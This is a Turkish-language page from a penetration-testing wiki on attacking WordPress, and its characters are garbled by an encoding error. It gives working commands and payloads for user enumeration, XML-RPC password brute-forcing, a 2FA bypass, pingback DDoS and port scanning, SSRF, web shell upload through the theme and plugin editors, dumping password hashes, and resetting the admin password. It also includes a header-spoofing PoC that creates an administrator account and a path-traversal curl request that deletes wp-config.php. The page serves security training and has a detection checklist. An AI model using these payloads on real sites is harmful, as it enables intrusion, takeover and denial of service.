# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgiler

- **Uploaded** dosyalar ÅŸu adrese gider: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** bu yÃ¼zden tema PHP dosyalarÄ±ndan birini deÄŸiÅŸtirip RCE elde etmeye Ã§alÄ±ÅŸÄ±yorsanÄ±z muhtemelen bu yolu kullanÄ±rsÄ±nÄ±z. Ã–rneÄŸin: **theme twentytwelve** kullanÄ±ldÄ±ÄŸÄ±nda **404.php** dosyasÄ±na ÅŸu adresten **eriÅŸebilirsiniz**: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- `wp-config.php` iÃ§inde veritabanÄ± root parolasÄ± bulunabilir.
- Kontrol edilecek varsayÄ±lan giriÅŸ yollarÄ±: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Ana WordPress DosyalarÄ±**

- `index.php`
- `license.txt` sÃ¼rÃ¼m gibi yararlÄ± bilgiler iÃ§erir.
- `wp-activate.php` yeni bir WordPress sitesi kurulurken e-posta aktivasyon sÃ¼reci iÃ§in kullanÄ±lÄ±r.
- GiriÅŸ klasÃ¶rleri (gizlemek iÃ§in yeniden adlandÄ±rÄ±lmÄ±ÅŸ olabilir):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` HTTP taÅŸÄ±ma mekanizmasÄ±, XML ise kodlama mekanizmasÄ± olarak hareket ederek veri iletimine izin veren WordPress Ã¶zelliÄŸini temsil eden bir dosyadÄ±r. Bu tÃ¼r iletiÅŸim WordPress [REST API](https://developer.wordpress.org/rest-api/reference) ile deÄŸiÅŸtirilmiÅŸtir.
- `wp-content` klasÃ¶rÃ¼ eklentilerin ve temalarÄ±n saklandÄ±ÄŸÄ± ana dizindir.
- `wp-content/uploads/` platforma yÃ¼klenen tÃ¼m dosyalarÄ±n saklandÄ±ÄŸÄ± dizindir.
- `wp-includes/` sertifikalar, fontlar, JavaScript dosyalarÄ± ve widget'lar gibi Ã§ekirdek dosyalarÄ±n bulunduÄŸu dizindir.
- `wp-sitemap.xml` WordPress 5.5 ve Ã¼zeri sÃ¼rÃ¼mlerde, tÃ¼m genel gÃ¶nderileri ve genel olarak sorgulanabilir gÃ¶nderi tÃ¼rleri ve taksonomilerle birlikte bir sitemap XML dosyasÄ± oluÅŸturur.

**Post exploitation**

- `wp-config.php` dosyasÄ± WordPress'in veritabanÄ±na baÄŸlanmak iÃ§in gereken veritabanÄ± adÄ±, veritabanÄ± hostu, kullanÄ±cÄ± adÄ± ve parola, kimlik doÄŸrulama anahtarlarÄ± ve salts ve veritabanÄ± tablo Ã¶neki gibi bilgileri iÃ§erir. Bu yapÄ±landÄ±rma dosyasÄ± ayrÄ±ca DEBUG modunu etkinleÅŸtirmek iÃ§in de kullanÄ±labilir; bu, sorun gidermede faydalÄ± olabilir.

### KullanÄ±cÄ± Ä°zinleri

- **Administrator**
- **Editor**: Kendi ve diÄŸerlerinin gÃ¶nderilerini yayÄ±nlar ve yÃ¶netir
- **Author**: Kendi gÃ¶nderilerini yayÄ±nlar ve yÃ¶netir
- **Contributor**: GÃ¶nderilerini yazar ve yÃ¶netir fakat yayÄ±nlayamaz
- **Subscriber**: GÃ¶nderileri gÃ¶rÃ¼ntÃ¼ler ve profilini dÃ¼zenler

## **Passive Enumeration**

### **WordPress sÃ¼rÃ¼mÃ¼nÃ¼ Ã¶ÄŸrenme**

`/license.txt` veya `/readme.html` dosyalarÄ±nÄ± bulup bulamayacaÄŸÄ±nÄ±za bakÄ±n

SayfanÄ±n **source code** iÃ§inde (Ã¶rnek: [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS baÄŸlantÄ± dosyalarÄ±

![](<../../images/image (533).png>)

- JavaScript dosyalarÄ±

![](<../../images/image (524).png>)

### Eklentileri Al
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### TemalarÄ± Al
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### SÃ¼rÃ¼mleri genel olarak Ã§Ä±karma
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Aktif keÅŸif

### Eklentiler ve Temalar

Muhtemelen tÃ¼m Eklentileri ve TemalarÄ± bulamayacaksÄ±nÄ±z. Hepsini keÅŸfetmek iÃ§in bir eklenti ve tema listesini **aktif olarak Brute Force** etmeniz gerekecek (umarÄ±z bizim iÃ§in bu listeleri iÃ§eren otomatik araÃ§lar vardÄ±r).

### KullanÄ±cÄ±lar

- **ID Brute:** Bir WordPress sitesinden geÃ§erli kullanÄ±cÄ±larÄ±, kullanÄ±cÄ± ID'lerini Brute Forcing yaparak elde edersiniz:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
If the responses are **200** or **30X**, that means that the id is **valid**. If the the response is **400**, then the id is **invalid**.

- **wp-json:** You can also try to get information about the users by querying:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
KullanÄ±cÄ±lar hakkÄ±nda bazÄ± bilgiler ortaya Ã§Ä±karabilecek bir baÅŸka `/wp-json/` endpoint ÅŸudur:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Bu uÃ§ noktanÄ±n yalnÄ±zca gÃ¶nderi yapmÄ±ÅŸ kullanÄ±cÄ±larÄ± aÃ§Ä±ÄŸa Ã§Ä±kardÄ±ÄŸÄ±nÄ± unutmayÄ±n. **Sadece bu Ã¶zellik etkin olan kullanÄ±cÄ±larla ilgili bilgi saÄŸlanacaktÄ±r**.

AyrÄ±ca **/wp-json/wp/v2/pages** IP adreslerini leak edebilir.

- **Login username enumeration**: GiriÅŸ yaparken **`/wp-login.php`** Ã¼zerinde gÃ¶sterilen **mesaj**, belirtilen **kullanÄ±cÄ± adÄ±nÄ±n var olup olmadÄ±ÄŸÄ±** durumuna gÃ¶re **farklÄ±dÄ±r**.

### XML-RPC

EÄŸer `xml-rpc.php` aktifse credentials brute-force yapabilir veya diÄŸer kaynaklara DoS saldÄ±rÄ±larÄ± baÅŸlatmak iÃ§in kullanabilirsiniz. (Bu sÃ¼reci otomatikleÅŸtirebilirsiniz, Ã¶rneÄŸin [using this](https://github.com/relarizky/wpxploit)).

Aktif olup olmadÄ±ÄŸÄ±nÄ± gÃ¶rmek iÃ§in _**/xmlrpc.php**_'e eriÅŸmeyi deneyin ve bu isteÄŸi gÃ¶nderin:

**Kontrol**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** veya **`metaWeblog.getUsersBlogs`** credentials'Ä± brute-force etmek iÃ§in kullanÄ±labilecek yÃ¶ntemlerden bazÄ±larÄ±dÄ±r. EÄŸer bunlardan herhangiÄŸini bulursanÄ±z ÅŸu ÅŸekilde bir ÅŸey gÃ¶nderebilirsiniz:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
200 kodlu bir yanÄ±tta, kimlik bilgilerinin geÃ§ersiz olmasÄ± durumunda _"Incorrect username or password"_ mesajÄ± gÃ¶rÃ¼nmelidir.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

DoÄŸru kimlik bilgilerini kullanarak bir dosya yÃ¼kleyebilirsiniz. YanÄ±tta dosya yolu gÃ¶rÃ¼necektir ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **daha hÄ±zlÄ± bir yol** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Bu yÃ¶ntem insanlar iÃ§in deÄŸil programlar iÃ§in tasarlanmÄ±ÅŸtÄ±r ve eskidir; bu nedenle 2FA'yÄ± desteklemez. Yani geÃ§erli creds'iniz varsa fakat ana giriÅŸ 2FA ile korunuyorsa, **xmlrpc.php'yi suistimal ederek bu creds ile 2FA'yÄ± atlayÄ±p login yapabiliyor olabilirsiniz**. Konsoldan yapabildiÄŸiniz tÃ¼m iÅŸlemleri gerÃ§ekleÅŸtiremeyebileceÄŸinizi unutmayÄ±n, ancak Ippsec'in [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) videosunda aÃ§Ä±kladÄ±ÄŸÄ± gibi yine de RCE'ye ulaÅŸabiliyor olabilirsiniz.

**DDoS veya port scanning**

EÄŸer listede _**pingback.ping**_ metodunu bulabilirseniz Wordpress'in herhangi bir host/porta rastgele bir istek gÃ¶ndermesini saÄŸlayabilirsiniz.\
Bu, binlerce Wordpress sitesinin tek bir konuma eriÅŸmesini saÄŸlayarak o konumda bir **DDoS** oluÅŸmasÄ±na neden olmak iÃ§in kullanÄ±labilir veya Wordpress'in bazÄ± iÃ§ **aÄŸ**larÄ± taramasÄ±nÄ± saÄŸlamak iÃ§in kullanÄ±labilir (herhangi bir port belirtilebilir).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

EÄŸer **faultCode** deÄŸeri **0**'dan (**17**) **bÃ¼yÃ¼k** ise, bu portun aÃ§Ä±k olduÄŸu anlamÄ±na gelir.

Ã–nceki bÃ¶lÃ¼mde **`system.multicall`** kullanÄ±mÄ±na bakÄ±n; bu yÃ¶ntemi kÃ¶tÃ¼ye kullanarak DDoS'a yol aÃ§mayÄ± Ã¶ÄŸrenin.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Bu dosya genellikle Wordpress sitesinin kÃ¶k dizininde bulunur: **`/wp-cron.php`**\
Bu dosyaya **eriÅŸildiÄŸinde** yoÄŸun bir MySQL **query** Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r, bu yÃ¼zden **saldÄ±rganlar** tarafÄ±ndan **DoS** oluÅŸturmak iÃ§in kullanÄ±labilir.\
AyrÄ±ca, varsayÄ±lan olarak `wp-cron.php` her sayfa yÃ¼klemesinde (bir istemci herhangi bir Wordpress sayfasÄ± talep ettiÄŸinde) Ã§aÄŸrÄ±lÄ±r; yÃ¼ksek trafikli sitelerde bu durum sorunlara (DoS) yol aÃ§abilir.

Wp-Cron'u devre dÄ±ÅŸÄ± bÄ±rakÄ±p, gereken iÅŸlemleri dÃ¼zenli aralÄ±klarla (sorun oluÅŸturmayacak ÅŸekilde) gerÃ§ekleÅŸtirecek gerÃ§ek bir cronjob'u host iÃ§inde oluÅŸturmanÄ±z Ã¶nerilir.

### /wp-json/oembed/1.0/proxy - SSRF

Åuraya eriÅŸmeyi deneyin: _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ â€” ve Worpress sitesi size bir istek yapabilir.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Bu araÃ§ **methodName: pingback.ping** ve **/wp-json/oembed/1.0/proxy** yolunu kontrol eder; eÄŸer mevcutsa, bunlarÄ± exploit etmeye Ã§alÄ±ÅŸÄ±r.

## Otomatik AraÃ§lar
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Bir biti Ã¼zerine yazarak eriÅŸim elde etme

GerÃ§ek bir saldÄ±rÄ±dan ziyade bu bir merak konusudur. CTF'de [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) herhangi bir wordpress dosyasÄ±ndaki 1 biti deÄŸiÅŸtirebiliyordunuz. BÃ¶ylece `/var/www/html/wp-includes/user.php` dosyasÄ±nÄ±n `5389` konumundaki biti NOP yaparak NOT (`!`) iÅŸlemini etkisizleÅŸtirebilirdiniz.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**KullanÄ±lan temadaki bir php'yi deÄŸiÅŸtirme (admin credentials gerekli)**

Appearance â†’ Theme Editor â†’ 404 Template (saÄŸda)

Ä°Ã§eriÄŸi php shell iÃ§in deÄŸiÅŸtirin:

![](<../../images/image (384).png>)

GÃ¼ncellenen sayfaya nasÄ±l eriÅŸileceÄŸini internette araÅŸtÄ±rÄ±n. Bu durumda ÅŸu adrese eriÅŸmeniz gerekiyor: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Åunu kullanabilirsiniz:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
bir oturum elde etmek.

## Eklenti RCE

### PHP eklentisi

.php dosyalarÄ±nÄ± bir eklenti olarak yÃ¼klemek mÃ¼mkÃ¼n olabilir.\
Ã–rneÄŸin ÅŸu ÅŸekilde bir php backdoor oluÅŸturun:

![](<../../images/image (183).png>)

Sonra yeni bir eklenti ekleyin:

![](<../../images/image (722).png>)

Eklentiyi yÃ¼kleyin ve Install Now dÃ¼ÄŸmesine basÄ±n:

![](<../../images/image (249).png>)

Procced'e tÄ±klayÄ±n:

![](<../../images/image (70).png>)

Muhtemelen gÃ¶rÃ¼nÃ¼rde bir ÅŸey yapmaz, ancak Media'ya giderseniz yÃ¼klenen shell'i gÃ¶receksiniz:

![](<../../images/image (462).png>)

EriÅŸin ve reverse shell'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in URL'yi gÃ¶receksiniz:

![](<../../images/image (1006).png>)

### KÃ¶tÃ¼ amaÃ§lÄ± eklenti yÃ¼kleme ve aktifleÅŸtirme

Bu yÃ¶ntem, zafiyeti bilinen ve web shell elde etmek iÃ§in sÃ¶mÃ¼rÃ¼lebilecek kÃ¶tÃ¼ amaÃ§lÄ± bir eklentinin kurulmasÄ±nÄ± kapsar. Bu iÅŸlem WordPress dashboard Ã¼zerinden ÅŸu ÅŸekilde gerÃ§ekleÅŸtirilir:

1. **Plugin Acquisition**: Eklenti, Exploit DB gibi bir kaynaktan edinilir, Ã¶rneÄŸin [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- WordPress dashboard'una gidin, ardÄ±ndan `Dashboard > Plugins > Upload Plugin` yolunu izleyin.
- Ä°ndirilen eklentinin zip dosyasÄ±nÄ± yÃ¼kleyin.
3. **Plugin Activation**: Eklenti baÅŸarÄ±yla kurulduktan sonra dashboard Ã¼zerinden aktifleÅŸtirilmelidir.
4. **Exploitation**:
- "reflex-gallery" eklentisi yÃ¼klÃ¼ ve etkinleÅŸtirilmiÅŸse, zafiyeti bilindiÄŸi iÃ§in sÃ¶mÃ¼rÃ¼lebilir.
- Metasploit framework'Ã¼ bu zafiyet iÃ§in bir exploit saÄŸlar. Uygun modÃ¼l yÃ¼klenip belirli komutlar Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, siteye yetkisiz eriÅŸim saÄŸlayan bir meterpreter oturumu kurulabilir.
- Bunun bir WordPress sitesini sÃ¶mÃ¼rmenin birÃ§ok yÃ¶nteminden sadece biri olduÄŸu unutulmamalÄ±dÄ±r.

Ä°Ã§erik, eklentiyi yÃ¼kleme ve aktifleÅŸtirme adÄ±mlarÄ±nÄ± gÃ¶steren gÃ¶rsel Ã¶ÄŸeler iÃ§erir. Ancak, bu ÅŸekilde zafiyetleri sÃ¶mÃ¼rmenin uygun yetki olmadan yasa dÄ±ÅŸÄ± ve etik dÄ±ÅŸÄ± olduÄŸunu belirtmek Ã¶nemlidir. Bu bilgiler sorumlu bir ÅŸekilde ve yalnÄ±zca yasal bir baÄŸlamda, Ã¶rneÄŸin aÃ§Ä±k izin ile yapÄ±lan penetration testing gibi durumlarda kullanÄ±lmalÄ±dÄ±r.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ WordPress'te bir **Cross-Site Scripting (XSS)** zafiyetini **Remote Code Execution (RCE)** veya diÄŸer kritik zafiyetlere yÃ¼kseltmek iÃ§in tasarlanmÄ±ÅŸ bir script'tir. Daha fazla bilgi iÃ§in [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html) bakÄ±n. AyrÄ±ca Wordpress Versions 6.X.X, 5.X.X and 4.X.X iÃ§in destek saÄŸlar ve ÅŸunlara olanak verir:
- _**Privilege Escalation:**_ WordPress'te bir kullanÄ±cÄ± oluÅŸturur.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Ã–zel plugin'inizi (backdoor) WordPress'e yÃ¼kleyin.
- _**(RCE) Built-In Plugin Edit:**_ WordPress'teki yerleÅŸik eklentileri dÃ¼zenleyin.
- _**(RCE) Built-In Theme Edit:**_ WordPress'teki yerleÅŸik temalarÄ± dÃ¼zenleyin.
- _**(Custom) Custom Exploits:**_ ÃœÃ§Ã¼ncÃ¼ taraf WordPress eklentileri/temalarÄ± iÃ§in Ã¶zel exploits.

## Post Exploitation

KullanÄ±cÄ± adlarÄ± ve parolalarÄ± Ã§Ä±karÄ±n:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Admin parolasÄ±nÄ± deÄŸiÅŸtir:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### SaldÄ±rÄ± YÃ¼zeyi

Bir Wordpress eklentisinin iÅŸlevselliÄŸi nasÄ±l aÃ§Ä±ÄŸa Ã§Ä±karabileceÄŸini bilmek, eklentinin iÅŸlevlerindeki gÃ¼venlik aÃ§Ä±klarÄ±nÄ± bulmak iÃ§in anahtardÄ±r. Bir eklentinin iÅŸlevselliÄŸi nasÄ±l aÃ§Ä±ÄŸa Ã§Ä±karabileceÄŸini aÅŸaÄŸÄ±daki maddelerde ve bazÄ± Ã¶rnek savunmasÄ±z eklentiler iÃ§in [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/) iÃ§erisinde bulabilirsiniz.

- **`wp_ajax`**

Bir eklentinin iÅŸlevlerini kullanÄ±cÄ±lara aÃ§masÄ±nÄ±n yollarÄ±ndan biri AJAX handlers aracÄ±lÄ±ÄŸÄ±yladÄ±r. Bu fonksiyonlar mantÄ±k, authorization veya authentication hatalarÄ± iÃ§erebilir. AyrÄ±ca, bu fonksiyonlarÄ±n hem authentication hem authorization'Ä±, **Wordpress instance'Ä±nda kimliÄŸi doÄŸrulanmÄ±ÅŸ herhangi bir kullanÄ±cÄ±nÄ±n sahip olabileceÄŸi** (rolÃ¼nden baÄŸÄ±msÄ±z olarak) bir wordpress nonce'un varlÄ±ÄŸÄ±na dayandÄ±rmasÄ± oldukÃ§a sÄ±k gÃ¶rÃ¼lÃ¼r.

These are the functions that can be used to expose a function in a plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv` kullanÄ±mÄ± endpoint'i herhangi bir kullanÄ±cÄ± tarafÄ±ndan (hatta kimlik doÄŸrulamasÄ± yapÄ±lmamÄ±ÅŸ kullanÄ±cÄ±lar dahil) eriÅŸilebilir hale getirir.**

> [!CAUTION]
> AyrÄ±ca, eÄŸer fonksiyon kullanÄ±cÄ±nÄ±n yetkilendirmesini sadece `wp_verify_nonce` fonksiyonu ile kontrol ediyorsa, bu fonksiyon yalnÄ±zca kullanÄ±cÄ±nÄ±n oturum aÃ§mÄ±ÅŸ olduÄŸunu doÄŸrular; genellikle kullanÄ±cÄ±nÄ±n rolÃ¼nÃ¼ kontrol etmez. Bu nedenle dÃ¼ÅŸÃ¼k ayrÄ±calÄ±klÄ± kullanÄ±cÄ±lar yÃ¼ksek ayrÄ±calÄ±klÄ± iÅŸlemlere eriÅŸebilir.

- **REST API**

AyrÄ±ca, wordpress'ten fonksiyonlarÄ± `register_rest_route` fonksiyonunu kullanarak bir REST API kaydederek aÃ§Ä±ÄŸa Ã§Ä±karmak da mÃ¼mkÃ¼ndÃ¼r:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` API metodunu Ã§aÄŸÄ±rmaya yetkili olup olmadÄ±ÄŸÄ±nÄ± kontrol eden bir callback fonksiyonudur.

**EÄŸer dahili `__return_true` fonksiyonu kullanÄ±lÄ±yorsa, kullanÄ±cÄ± izinleri kontrolÃ¼nÃ¼ basitÃ§e atlayacaktÄ±r.**

- **PHP dosyasÄ±na doÄŸrudan eriÅŸim**

Elbette, Wordpress PHP kullanÄ±r ve eklenti iÃ§indeki dosyalar web Ã¼zerinden doÄŸrudan eriÅŸilebilir. Bu yÃ¼zden, eÄŸer bir eklenti sadece dosyaya eriÅŸmekle tetiklenen herhangi bir zafiyetli iÅŸlevsellik aÃ§Ä±yorsa, bu herhangi bir kullanÄ±cÄ± tarafÄ±ndan istismar edilebilir.

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

BazÄ± eklentiler dahili entegrasyonlar veya reverse proxies iÃ§in â€œtrusted headerâ€ kÄ±sayollarÄ± uygular ve ardÄ±ndan bu header'Ä± REST istekleri iÃ§in mevcut kullanÄ±cÄ± baÄŸlamÄ±nÄ± ayarlamak iÃ§in kullanÄ±r. EÄŸer header upstream bir bileÅŸen tarafÄ±ndan kriptografik olarak isteÄŸe baÄŸlanmamÄ±ÅŸsa, bir saldÄ±rgan bunu taklit edebilir ve ayrÄ±calÄ±klÄ± REST rotalarÄ±na administrator olarak eriÅŸebilir.

- Etkisi: kimlik doÄŸrulamasÄ± yapÄ±lmamÄ±ÅŸ yetki yÃ¼kseltme ile admin'e eriÅŸim â€” core users REST route Ã¼zerinden yeni bir administrator oluÅŸturarak.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (kullanÄ±cÄ± ID'sini 1 olarak zorlar, genellikle ilk administrator hesabÄ±).
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Neden iÅŸe yarÄ±yor

- Eklenti, istemci tarafÄ±ndan kontrol edilen bir baÅŸlÄ±ÄŸÄ± kimlik doÄŸrulama durumuna eÅŸleyip yetki kontrollerini atlÄ±yor.
- WordPress Ã§ekirdeÄŸi bu rota iÃ§in `create_users` yetkisini bekler; eklenti hilesi bu kontrole takÄ±lmayÄ±p baÅŸlÄ±ktan doÄŸrudan mevcut kullanÄ±cÄ± baÄŸlamÄ±nÄ± ayarlayarak engeli aÅŸÄ±yor.

Beklenen baÅŸarÄ± gÃ¶stergeleri

- JSON gÃ¶vdesiyle birlikte HTTP 201, oluÅŸturulan kullanÄ±cÄ±yÄ± tanÄ±mlayan bir cevap.
- `wp-admin/users.php` iÃ§inde gÃ¶rÃ¼nen yeni bir admin kullanÄ±cÄ±.

Tespit kontrol listesi

- `getallheaders()`, `$_SERVER['HTTP_...']` veya kullanÄ±cÄ± baÄŸlamÄ±nÄ± ayarlamak iÃ§in Ã¶zel baÅŸlÄ±klarÄ± okuyan vendor SDK'larÄ± (Ã¶r. `wp_set_current_user()`, `wp_set_auth_cookie()`) iÃ§in grep ile ara.
- GÃ¼Ã§lÃ¼ `permission_callback` kontrolleri olmayan ve bunun yerine istek baÅŸlÄ±klarÄ±na dayanan ayrÄ±calÄ±klÄ± callback'ler iÃ§in REST kayÄ±tlarÄ±nÄ± gÃ¶zden geÃ§ir.
- REST handler'larÄ± iÃ§inde yalnÄ±zca baÅŸlÄ±k deÄŸerleri ile sÄ±nÄ±rlandÄ±rÄ±lmÄ±ÅŸ core kullanÄ±cÄ± yÃ¶netim fonksiyonlarÄ±nÄ±n (`wp_insert_user`, `wp_create_user`) kullanÄ±mÄ±na bak.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress temalarÄ± ve eklentileri sÄ±klÄ±kla `wp_ajax_` ve `wp_ajax_nopriv_` hook'larÄ± Ã¼zerinden AJAX handler'larÄ± aÃ§Ä±ÄŸa Ã§Ä±karÄ±r. **_nopriv_** varyantÄ± kullanÄ±ldÄ±ÄŸÄ±nda **callback yetkisiz ziyaretÃ§iler tarafÄ±ndan eriÅŸilebilir hale gelir**, bu yÃ¼zden herhangi bir hassas iÅŸlem ek olarak ÅŸu kontrolleri uygulamalÄ±dÄ±r:

1. Bir **yetki kontrolÃ¼** (Ã¶r. `current_user_can()` veya en azÄ±ndan `is_user_logged_in()`), ve
2. `check_ajax_referer()` / `wp_verify_nonce()` ile doÄŸrulanan bir **CSRF nonce**, ve
3. **SÄ±kÄ± girdi temizleme/doÄŸrulama**.

Litho multipurpose tema (< 3.1), *Remove Font Family* Ã¶zelliÄŸinde bu 3 kontrolÃ¼ unutmuÅŸ ve sonuÃ§ olarak aÅŸaÄŸÄ±daki kodu (basitleÅŸtirilmiÅŸ) daÄŸÄ±tmÄ±ÅŸtÄ±:
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Bu kod parÃ§asÄ±nÄ±n getirdiÄŸi sorunlar:

* **Unauthenticated access** â€“ the `wp_ajax_nopriv_` hook kayÄ±tlÄ±.
* **No nonce / capability check** â€“ herhangi bir ziyaretÃ§i endpoint'e istek gÃ¶nderebilir.
* **No path sanitisation** â€“ kullanÄ±cÄ± tarafÄ±ndan kontrol edilen `fontfamily` dizesi filtrelenmeden bir dosya sistemi yoluna ekleniyor, klasik `../../` traversal'Ä±na izin veriyor.

#### Exploitation

Bir saldÄ±rgan tek bir HTTP POST isteÄŸi gÃ¶ndererek **uploads ana dizininin altÄ±ndaki** (genelde `<wp-root>/wp-content/uploads/`) herhangi bir dosyayÄ± veya dizini silebilir:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

